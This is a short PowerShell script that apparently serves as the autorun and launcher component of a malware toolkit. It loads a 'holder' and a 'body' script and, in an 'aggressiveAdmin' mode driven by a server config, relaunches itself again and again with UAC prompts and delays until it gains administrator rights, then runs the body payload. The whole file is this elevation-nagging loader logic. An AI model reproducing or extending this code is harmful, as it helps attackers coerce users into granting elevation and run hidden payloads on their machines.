. ./utils.ps1
. ./consts_body.ps1

$globalScriptPaths = @(
    #$MyInvocation.MyCommand.Definition,
    $PSCommandPath,
    $MyInvocation.MyCommand.Path
)

function Get-ScriptPath {
    
    foreach ($path in $globalScriptPaths) {
        try {
            if (Test-Path $path) {
                return $path
            }
        }
        catch {
        }
    }
}

function do_autorun()
{
    $holder = (Get-HolderPath)
    $body = (Get-BodyPath)
    if ($server.aggressiveAdmin)
    {
        $elevated = IsElevated
        if ($elevated)
        {
            writedbg "running elevated body path in aggressive admin"
            RunMe -script $body  -repassArgs $false -argName "" -argValue "" -uac $true
        } 
        else 
        {
            $attempt = GetArgInt("attempt")
            $attempt = $attempt + 1
            if ($attempt -ne 1)
            {
                $sleep = $server.aggressiveAdminDelay
                writedbg "Not elevated, sleeping: $sleep"
                Start-Sleep -Seconds $sleep
            }
            writedbg "trying to elevate holder"
            try {
                RunMe -script $holder -repassArgs $false -argName "attempt" -argValue $attempt -uac $true  
            }
            catch {
                RunMe -script $holder -repassArgs $true -argName "attempt" -argValue $attempt -uac $false  
            }        
        }
    }
    else 
    {
        writedbg "No aggresive admin"
        try 
        {
            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $true
        }
        catch {
            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $false
        }
    }

}

do_autorun